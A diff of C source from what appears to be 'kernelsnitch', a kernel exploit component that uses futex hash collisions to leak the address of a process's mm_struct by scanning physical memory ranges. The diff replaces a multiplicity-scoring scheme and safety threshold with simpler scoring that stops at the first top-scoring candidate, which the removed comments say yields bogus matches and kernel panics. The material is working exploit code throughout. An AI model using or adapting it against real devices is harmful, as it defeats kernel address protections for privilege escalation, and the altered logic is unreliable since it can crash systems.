@@ -220,9 +220,7 @@ static void *__mm_leak(void *arg)
         if ((coarse_addr % (1ULL << 40)) == 0)
             if (ks->verbose) pr_info("[% 3zd] [%016zx-%016llx]\n", range->id, coarse_addr, coarse_addr + (1ULL << 40));
         for (size_t slab_addr = coarse_addr; (slab_addr < coarse_addr + COARSE_SZ) && !ks->found; slab_addr += mm_slab_sz) {
-            /* CDY v5: the device RAM top is BELOW the fixed 8GB scan
-               range (7.93GB candidate deref = L1 translation fault).
-               Clamp to the panic-proven mapped span [1GB, 6GB). */
+            /* CDY v5: clamp to the panic-proven mapped span. */
             if (slab_addr >= LINEAR_SAFE_END)
                 break;
             if (slab_addr < LINEAR_SAFE_START)
@@ -230,36 +228,21 @@ static void *__mm_leak(void *arg)
             for (size_t mm_struct_candidate = slab_addr; (mm_struct_candidate < slab_addr + mm_slab_sz) && !ks->found; mm_struct_candidate += ks->mm_struct_sz) {
 
                 if (!ks->mte_enabled) {
-                    /* CDY 4.14 v2: FULL scan, no early exit. The old code set
-                       found=1 at the FIRST candidate tying the best score, so
-                       an 8-thread race handed the win to whichever thread hit
-                       a 1/4096 hash fluke first (bogus mm at phys 0x780!).
-                       Scoring = the largest multiplicity among the per-
-                       collision bucket hashes: the true mm makes the VALID
-                       collisions agree on one bucket (high multiplicity),
-                       garbage stays scattered (~1). */
-                    size_t hs[16];
-                    for (size_t i = 0; i < ks->collisions && i < 16; ++i)
-                        hs[i] = futex_hash(ks->futex_addrs[i], mm_struct_candidate);
+                    // CDY 4.14: score the candidate against ALL collision
+                    // addresses; the true mm matches the most (some later
+                    // observations go stale on this device). Keep the
+                    // top-scoring candidates.
                     size_t score = 0;
-                    for (size_t i = 0; i < ks->collisions && i < 16; ++i) {
-                        size_t mult = 0;
-                        for (size_t j = 0; j < ks->collisions && j < 16; ++j)
-                            mult += (hs[i] == hs[j]);
-                        if (mult > score) score = mult;
-                    }
-                    /* v3: hard threshold. A false-positive candidate can
-                       score ~4 by luck on noisy collisions, but the true mm
-                       matches EVERY valid collision; with 16 collisions even
-                       heavy noise leaves >=6 valid ones. Below 6 the leak is
-                       treated as FAILED (clean abort, retry the spray) -
-                       walking to an unmapped bogus page panics the box. */
-                    if (score >= 2 && score > ks->best_score) {
+                    for (size_t i = 1; i < ks->collisions; ++i)
+                        score += (futex_hash(ks->futex_addrs[0], mm_struct_candidate) == futex_hash(ks->futex_addrs[i], mm_struct_candidate));
+                    if (score > ks->best_score) {
                         ks->best_score = score;
                         ks->mm_cand_cnt = 0;
                     }
-                    if (score >= 2 && score == ks->best_score && ks->mm_cand_cnt < 8) {
+                    if (score == ks->best_score && score > 0 && ks->mm_cand_cnt < 8) {
                         ks->mm_cands[ks->mm_cand_cnt++] = mm_struct_candidate;
+                        ks->mm_struct = mm_struct_candidate;
+                        ks->found = 1;
                     }
                 } else {
                     // need to set the tag if mte is enabled
@@ -395,8 +378,7 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
     if (wanted == count) {
         if (ks->verbose) pr_info("found %zd collisisons\n", count);
         ks->state = KERNELSNITCH_COLLISIONS_FOUND;
-    }
-    if (wanted != count) {
+    } else {
         pr_warning("only found %zd collisions -> cannot continue\n", count);
         ks->state = KERNELSNITCH_COLLISIONS_NOT_FOUND;
     }
